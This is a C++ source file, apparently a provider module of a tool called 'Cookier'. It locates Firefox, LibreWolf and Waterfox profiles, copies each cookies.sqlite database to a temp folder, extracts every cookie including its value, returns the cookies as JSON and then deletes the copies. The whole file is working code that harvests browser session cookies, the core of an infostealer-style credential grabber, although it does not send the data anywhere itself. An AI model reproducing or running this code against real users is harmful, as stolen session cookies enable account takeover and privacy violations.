// providers/gecko/GeckoExtract.cpp
// Compiled INTO Provider_Chromium.dll - shares one sqlite3 statically-linked copy.
#define PROVIDER_EXPORTS
#include "../../src/Cookier.h"
#include <windows.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iostream>
#include <cstring>
#include <cstdio>

namespace fs = std::filesystem;

static std::string NarrowG(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

static std::string EscapeJsonG(const std::string& s) {
    std::string out; out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            case '\b': out += "\\b"; break;
            case '\f': out += "\\f"; break;
            default:
                if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
                else out += (char)c;
        }
    }
    return out;
}

static std::wstring GeckoBasePath(const std::string& browser) {
    PWSTR appdata = nullptr;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appdata);
    std::wstring p(appdata);
    CoTaskMemFree(appdata);
    if (browser == "firefox")   return p + L"\\Mozilla\\Firefox";
    if (browser == "librewolf") return p + L"\\LibreWolf";
    if (browser == "waterfox")  return p + L"\\Waterfox";
    return L"";
}

static std::vector<std::wstring> FindGeckoProfiles(const std::wstring& basePath) {
    std::vector<std::wstring> profiles;
    std::wstring profilesDir = basePath + L"\\Profiles";
    try {
        for (const auto& entry : fs::directory_iterator(profilesDir, fs::directory_options::skip_permission_denied)) {
            if (entry.is_directory()) {
                fs::path cookies = entry.path() / L"cookies.sqlite";
                if (fs::exists(cookies)) profiles.push_back(entry.path().filename().wstring());
            }
        }
    } catch (...) {}
    return profiles;
}

static std::string ExtractGeckoFromDb(const std::wstring& dbPath) {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring tempDir = std::wstring(tempPath) + L"gecko_extract_" + std::to_wstring(GetCurrentProcessId());
    CreateDirectoryW(tempDir.c_str(), nullptr);
    std::wstring destDb = tempDir + L"\\cookies.sqlite";
    CopyFileW(dbPath.c_str(), destDb.c_str(), FALSE);
    std::wstring walSrc = dbPath + L"-wal", walDst = destDb + L"-wal";
    if (fs::exists(walSrc)) CopyFileW(walSrc.c_str(), walDst.c_str(), FALSE);
    std::wstring shmSrc = dbPath + L"-shm", shmDst = destDb + L"-shm";
    if (fs::exists(shmSrc)) CopyFileW(shmSrc.c_str(), shmDst.c_str(), FALSE);

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(NarrowG(destDb).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        DeleteFileW(destDb.c_str()); DeleteFileW(walDst.c_str()); DeleteFileW(shmDst.c_str());
        return "";
    }
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies;", -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileW(destDb.c_str()); DeleteFileW(walDst.c_str()); DeleteFileW(shmDst.c_str());
        return "";
    }

    std::string out; out.reserve(16384);
    bool first = true;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* host_raw = sqlite3_column_text(stmt, 0);
        const unsigned char* name_raw = sqlite3_column_text(stmt, 1);
        const unsigned char* value_raw = sqlite3_column_text(stmt, 2);
        const unsigned char* path_raw = sqlite3_column_text(stmt, 3);
        const char* host = host_raw ? (const char*)host_raw : "";
        const char* name = name_raw ? (const char*)name_raw : "";
        const char* value = value_raw ? (const char*)value_raw : "";
        const char* path = path_raw ? (const char*)path_raw : "";
        long long expiry = sqlite3_column_int64(stmt, 4);
        int secure = sqlite3_column_int(stmt, 5);
        int httponly = sqlite3_column_int(stmt, 6);

        if (!first) out += ",\n";
        first = false;
        out += "    {\n";
        out += "      \"host_key\": \""; out += EscapeJsonG(host); out += "\",\n";
        out += "      \"name\": \""; out += EscapeJsonG(name); out += "\",\n";
        out += "      \"value\": \""; out += EscapeJsonG(value); out += "\",\n";
        out += "      \"path\": \""; out += EscapeJsonG(path); out += "\",\n";
        out += "      \"expires_utc\": "; out += std::to_string(expiry); out += ",\n";
        out += "      \"is_secure\": "; out += (secure ? "true" : "false"); out += ",\n";
        out += "      \"is_httponly\": "; out += (httponly ? "true" : "false"); out += "\n";
        out += "    }";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileW(destDb.c_str()); DeleteFileW(walDst.c_str()); DeleteFileW(shmDst.c_str());
    RemoveDirectoryW(tempDir.c_str());
    return out;
}

extern "C" bool ExtractGeckoCookies(char** outJson, const char* browserName, const char* profileList, bool verbose) {
    std::string browser = browserName ? browserName : "firefox";
    std::wstring basePath = GeckoBasePath(browser);
    if (basePath.empty()) {
        std::cerr << "[!] GeckoProvider: unsupported browser: " << browser << "\n";
        return false;
    }

    auto allProfiles = FindGeckoProfiles(basePath);
    if (allProfiles.empty()) {
        std::cerr << "[!] GeckoProvider: no profiles found under " << NarrowG(basePath) << "\n";
        return false;
    }

    std::vector<std::wstring> targetProfiles;
    if (std::string(profileList) == "all") {
        targetProfiles = allProfiles;
    } else {
        std::stringstream ss(profileList); std::string item;
        while (std::getline(ss, item, ',')) {
            std::wstring w(item.begin(), item.end());
            for (auto& p : allProfiles) if (p == w) { targetProfiles.push_back(p); break; }
        }
        if (targetProfiles.empty() && std::string(profileList) == "Default") {
            std::cerr << "[i] No Gecko profile named 'Default' - using all profiles.\n";
            targetProfiles = allProfiles;
        }
    }
    if (targetProfiles.empty()) {
        std::cerr << "[!] GeckoProvider: requested profiles not found\n";
        return false;
    }

    std::string out = "{\n";
    bool firstProfile = true;
    for (auto& profile : targetProfiles) {
        std::wstring dbPath = basePath + L"\\Profiles\\" + profile + L"\\cookies.sqlite";
        std::string profileJson = ExtractGeckoFromDb(dbPath);
        if (!firstProfile) out += ",\n";
        firstProfile = false;
        out += "  \"" + EscapeJsonG(NarrowG(profile)) + "\": [";
        if (!profileJson.empty()) out += "\n" + profileJson + "\n  ]";
        else out += "]";
    }
    out += "\n}";

    *outJson = (char*)CoTaskMemAlloc(out.length() + 1);
    if (*outJson) memcpy(*outJson, out.c_str(), out.length() + 1);
    return true;
}